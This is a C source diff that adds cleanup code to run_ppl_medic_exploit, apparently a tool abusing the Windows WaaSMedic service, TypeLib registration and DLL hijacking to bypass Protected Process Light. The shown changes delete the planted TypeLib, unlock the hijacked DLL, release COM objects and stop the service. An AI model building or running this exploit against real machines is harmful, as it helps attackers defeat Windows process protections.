@@ -13,6 +13,7 @@ BOOL run_ppl_medic_exploit(
 {
     BOOL       success                      = FALSE;
     BOOL       ret_val                      = FALSE;
+    BOOL       StateTypeLibCreated          = FALSE;
     HANDLE     hBaseNamedObjects            = NULL;
     LPWSTR     TypeLibPath                  = NULL;
     LPWSTR     TypeLibRegValuePath          = NULL;
@@ -82,6 +83,8 @@ BOOL run_ppl_medic_exploit(
     success = write_type_lib(TypeLibPath);
     if (!success)
         goto cleanup;
+
+    StateTypeLibCreated = TRUE;
 
     success = get_type_lib_reg_value_path(&TypeLibRegValuePath);
     if (!success)
@@ -282,16 +285,12 @@ cleanup:
 
     if (hBaseNamedObjects)
         NtClose(hBaseNamedObjects);
-    if (TypeLibPath)
-        intFree(TypeLibPath);
     if (TypeLibRegValuePath)
         intFree(TypeLibRegValuePath);
     if (TypeLibOrigPath)
         intFree(TypeLibOrigPath);
     if (hTI)
         NtClose(hTI);
-    if (TypeLibRegValuePath)
-        intFree(TypeLibRegValuePath);
     if (DllSectionHandle)
         NtClose(DllSectionHandle);
     if (DummyDllFileHandle)
@@ -300,16 +299,79 @@ cleanup:
         intFree(ProxyStubRegValuePath);
     if (ProxyStubOrigPath)
         intFree(ProxyStubOrigPath);
+    if (StatePluginDllLocked)
+        unlock_plugin_dll(WaaSMedicCapsuleHandle);
     if (WaaSMedicCapsuleHandle)
         NtClose(WaaSMedicCapsuleHandle);
     if (WaaSMedicCapsulePath)
         intFree(WaaSMedicCapsulePath);
     if (ProxyStubDllLoadEventName)
         intFree(ProxyStubDllLoadEventName);
+    if (IWaaSRemediationEx)
+        release_client(IWaaSRemediationEx);
+    if (ProxyStubDllLoadEventHandle)
+        NtClose(ProxyStubDllLoadEventHandle);
+    if (HollowedDllPath)
+        intFree(HollowedDllPath);
+    if (HijackedDllName)
+        intFree(HijackedDllName);
+    if (HijackedDllSectionPath)
+        intFree(HijackedDllSectionPath);
+    if (StateTypeLibCreated)
+        delete_type_lib(TypeLibPath);
+    if (TypeLibPath)
+        intFree(TypeLibPath);
+    if (is_service_running(STR_WAASMEDIC_SVC))
+        stop_service_by_name(STR_WAASMEDIC_SVC, TRUE);
 
-    // TODO: StatePluginDllLocked ?
-    // TODO: free IWaaSRemediationEx?
-    // TODO: CoUninitialize
+    return ret_val;
+}
+
+BOOL delete_type_lib(
+    IN LPWSTR TypeLibPath)
+{
+    BOOL ret_val = FALSE;
+    BOOL success = FALSE;
+
+    success = DeleteFileW(TypeLibPath);
+    if (!success)
+    {
+        function_failed("DeleteFileW");
+        goto cleanup;
+    }
+
+    ret_val = TRUE;
+
+cleanup:
+
+    if (!ret_val)
+    {
+        DPRINT_ERR("Failed to delete custom TypeLib file: %ls", TypeLibPath);
+    }
+
+    return ret_val;
+}
+
+BOOL unlock_plugin_dll(
+    IN HANDLE WaaSMedicCapsuleHandle)
+{
+    BOOL ret_val = FALSE;
+    BOOL success = FALSE;
+
+    if (!WaaSMedicCapsuleHandle)
+        return TRUE;
+
+    success = UnlockFile(WaaSMedicCapsuleHandle, 0, 0, 4096, 0);
+    if (!success)
+        goto cleanup;
+
+    ret_val = TRUE;
+
+cleanup:
+    if (!ret_val)
+    {
+        DPRINT_ERR("Failed to unlock Plugin DLL");
+    }
 
     return ret_val;
 }
